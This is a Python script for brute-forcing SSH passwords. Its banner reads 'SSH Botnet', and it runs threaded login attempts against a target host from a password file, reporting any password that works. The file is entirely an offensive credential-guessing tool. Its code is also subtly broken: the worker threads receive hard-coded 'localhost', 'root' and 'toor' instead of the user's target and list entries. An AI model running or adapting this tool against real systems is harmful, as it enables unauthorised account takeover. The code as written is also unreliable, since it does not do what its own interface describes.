#!/usr/bin/env python
import argparse
import os
import time
from threading import *

from pexpect import pxssh

maxConnections = 5
connection_lock = BoundedSemaphore(value=maxConnections)
Found = False
Fails = 0


class colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'


banner = r"""{}{}
 ____  ____  _  _    ____   __  ____  __ _  ____  ____ 
/ ___)/ ___)/ )( \  (  _ \ /  \(_  _)(  ( \(  __)(_  _)
\___ \\___ \) __ (   ) _ ((  O ) )(  /    / ) _)   )(  
(____/(____/\_)(_/  (____/ \__/ (__) \_)__)(____) (__) 
============================Written by t@kuz00E898======{}
""".format(colors.OKGREEN, colors.BOLD, colors.END)


# Return SSH connection for given username@host -p password
def connect(host, user, password, release):
    global Found
    global Fails

    s = pxssh.pxssh()
    try:
        s.login(host, user, password)
        print("[+] Password found: {}".format(password))
        Found = True
    except Exception as e:
        Fails += 1
        if 'read_nonblocking' in str(e):
            time.sleep(5)
        elif 'synchronize with original prompt' in str(e):
            time.sleep(1)
        if Fails < 5:
            connect(host, user, password, False)
        else:
            print("[!] Exiting: Too Many Socket Timeouts.")
    finally:
        if release:
            connection_lock.release()
    return s


if __name__ == "__main__":
    print(banner)
    parser = argparse.ArgumentParser(usage='%(prog)s -H <target host> -u <username> -F <password file>')

    parser.add_argument('-H', dest='target_host', type=str,
                        required=True, help='Specify target host.')
    parser.add_argument('-u', dest='username', type=str,
                        required=True, help='Specify account username.')
    parser.add_argument('-F', dest='password_file', type=str,
                        required=True, help='Specify file containing all possible passwords.')

    options = parser.parse_args()

    fn = open(options.password_file, "r")
    for line in fn.readlines():
        Fails = 0
        if Found:
            print("[*] Exiting: Password found")
            exit(0)
        connection_lock.acquire()
        password = line.strip("\r").strip("\n")
        print("[-] Testing: {}".format(password))
        t = Thread(target=connect, args=("localhost", "root", "toor", True))
        child = t.start()
